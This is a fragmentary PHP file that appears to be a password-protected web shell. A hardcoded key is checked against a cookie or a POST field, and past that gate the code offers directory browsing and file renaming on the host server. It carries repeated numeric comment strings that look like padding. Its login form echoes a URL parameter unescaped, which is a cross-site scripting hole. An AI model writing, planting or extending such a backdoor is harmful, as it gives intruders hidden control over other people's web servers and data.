...
$auth_key = "5fad44348e5316e98f22aad47fe8a2d5";
...
$pass = false;
if (isset($_COOKIE['pw_name_23129'])) {
    if(($_COOKIE['pw_name_23129']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_23129'])) {
        if(($_POST['pw_name_23129']) == $auth_key) {
            setcookie("pw_name_23129", $_POST['pw_name_23129']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_23129' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739014668976879 1739014668997629 1739014668745204 1739014668798231
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739014668976879 1739014668997629 1739014668745204 1739014668798231
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739014668976879 1739014668997629 1739014668745204 1739014668798231
            $name = PATH . "/" . $_GET['r'];
